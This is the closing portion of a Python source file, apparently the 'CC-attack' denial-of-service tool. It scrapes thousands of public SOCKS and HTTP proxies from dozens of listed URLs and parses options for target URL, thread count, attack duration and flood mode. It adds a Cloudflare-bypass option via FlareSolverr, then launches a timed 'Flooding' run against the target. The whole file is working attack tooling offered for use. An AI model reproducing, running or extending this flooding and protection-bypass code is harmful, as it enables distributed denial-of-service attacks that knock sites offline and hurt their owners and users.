	with open(out_file, 'wb') as fp:
		for lines in list(proxies):
			fp.write(bytes(lines,encoding='utf8'))
		fp.close()
	print("> They are saved in "+out_file)
			
def check_list(socks_file):
	print("> Checking list")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i and '#' not in i:
				try:
					socket.inet_pton(socket.AF_INET,i.strip().split(":")[0])#check valid ip v4
					temp_list.append(i)
				except:
					pass
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def DownloadProxies(proxy_ver):
	if proxy_ver == "4":
		f = open(out_file,'wb')
		socks4_api = [
			#"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=socks",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			#"https://openproxy.space/list/socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			#"https://spys.me/socks.txt",
			#"https://www.freeproxychecker.com/result/socks4_proxies.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
			"https://api.openproxylist.xyz/socks4.txt",
		]
		for api in socks4_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
		try:#credit to All3xJ
			r = requests.get("https://www.socks-proxy.net/",timeout=5)
			part = str(r.content)
			part = part.split("<tbody>")
			part = part[1].split("</tbody>")
			part = part[0].split("<tr><td>")
			proxies = ""
			for proxy in part:
				proxy = proxy.split("</td><td>")
				try:
					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
				except:
					pass
				fd = open(out_file,"a")
				fd.write(proxies)
				fd.close()
		except:
			pass
	if proxy_ver == "5":
		f = open(out_file,'wb')
		socks5_api = [
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5.txt",
			#"https://www.freeproxychecker.com/result/socks5_proxies.txt",
			#http://proxysearcher.sourceforge.net/Proxy%20List.php?type=socks",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			#"https://openproxy.space/list/socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
			#"https://spys.me/socks.txt",
			#"http://www.socks24.org/feeds/posts/default"",
		]
		for api in socks5_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
	if proxy_ver == "http":
		f = open(out_file,'wb')
		http_api = [
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxyscan.io/download?type=http",
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
			"https://api.openproxylist.xyz/http.txt",
			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
			"http://alexa.lr2b.com/proxylist.txt",
			#"https://www.freeproxychecker.com/result/http_proxies.txt",
			#"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
			"https://proxy-spider.com/api/proxies.example.txt",
			"https://multiproxy.org/txt_all/proxy.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
			#"https://openproxy.space/list/http",
			"https://openproxylist.xyz/http.txt",
			"https://proxyspace.pro/http.txt",
			"https://proxyspace.pro/https.txt",
			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://rootjazz.com/proxies/proxies.txt",
			"https://sheesh.rip/http.txt",
			#"https://spys.me/proxy.txt",
			"https://www.proxy-list.download/api/v1/get?type=https",
		]
		for api in http_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
	print("> Have already downloaded proxies list as "+out_file)

def PrintHelp():
	print('''===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
   -cf       | enable Cloudflare bypass (NEW)
   -fs       | set FlareSolverr URL (NEW)
=====================================================''')


def main():
	global proxy_ver
	global data
	global cookies
	global brute
	global url
	global out_file
	global thread_num
	global mode
	global target
	global proxies
	global USE_FLARESOLVERR, FLARESOLVERR_URL
	target = ""
	check_proxies = False
	download_socks = False
	proxy_type = 5
	period = 60
	help = False
	print("> Mode: [cc/post/head]")#slow]")
	for n,args in enumerate(sys.argv):
		if args == "-help" or args =="-h":
			help =True
		if args=="-url":
			ParseUrl(sys.argv[n+1])
		if args=="-m" or args=="-mode":
			mode = sys.argv[n+1]
			if mode not in ["cc","post","head"]:#,"slow"]:
				print("> -m/-mode argument error")
				return
		if args =="-v":
			proxy_ver = sys.argv[n+1]
			if proxy_ver == "4":
				proxy_type = 4
			elif proxy_ver == "5":
				proxy_type = 5
			elif proxy_ver == "http":
				proxy_type = 0
			elif proxy_ver not in ["4","5","http"]:
				print("> -v argument error (only 4/5/http)")
				return
		if args == "-b":
			if sys.argv[n+1] == "1":
				brute = True
			elif sys.argv[n+1] == "0":
				brute = False
			else:
				print("> -b argument error")
				return
		if args == "-t":
			try:
				thread_num = int(sys.argv[n+1])
			except:
				print("> -t must be integer")
				return
		if args == "-cookies":
			cookies = sys.argv[n+1]
		if args == "-data":
			data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
		if args == "-f":
			out_file = sys.argv[n+1]
		if args == "-down":
			download_socks=True
		if args == "-check":
			check_proxies = True
		if args == "-s":
			try:
				period = int(sys.argv[n+1])
			except:
				print("> -s must be integer")
				return
		# 在现有的参数解析循环中添加：
		if args == '-cf' or args == '--cloudflare':
		    USE_FLARESOLVERR = True
		    print("[INFO] Cloudflare bypass enabled via FlareSolverr")
		if args == '-fs' or args == '--flaresolverr':
		    FLARESOLVERR_URL = sys.argv[n+1]
		    print(f"[INFO] FlareSolverr URL set to: {FLARESOLVERR_URL}")			

	if download_socks:
		DownloadProxies(proxy_ver)

	if os.path.exists(out_file)!=True:
		print("Proxies file not found")
		return
	proxies = open(out_file).readlines()	
	check_list(out_file)
	proxies = open(out_file).readlines()	
	if len(proxies) == 0:
		print("> There are no more proxies. Please download a new proxies list.")
		return
	print ("> Number Of Proxies: %d" %(len(proxies)))
	if check_proxies:
		check_socks(3)

	proxies = open(out_file).readlines()
	
	if help:
		PrintHelp()

	if target == "":
		print("> There is no target. End of process ")
		return
	'''
	if mode == "slow":
		th = threading.Thread(target=slow,args=(thread_num,proxy_type,))
		th.daemon = True
		th.start()
	else:'''
	event = threading.Event()
	print("> Building threads...")
	build_threads(mode,thread_num,event,proxy_type)
	event.clear()
	#input("Press Enter to continue.")
	# 在 event.set() 之前添加：
	if USE_FLARESOLVERR:
	    print("[INFO] Initializing FlareSolverr session...")
	    if init_flaresolverr_session():
	        print("[INFO] Solving initial Cloudflare challenge...")
	        if solve_cloudflare(full_target_url):
	            print("[SUCCESS] Cloudflare challenge solved!")
	        else:
	            print("[WARNING] Failed to solve Cloudflare challenge, continuing anyway...")
	    else:
	        print("[ERROR] Failed to initialize FlareSolverr session")
	        USE_FLARESOLVERR = False
	event.set()
	print("> Flooding...")
	time.sleep(period)
	print("\n> 攻击结束，最终统计:")
	print_stats()

if __name__ == "__main__":
	main()#Coded by Leeon123
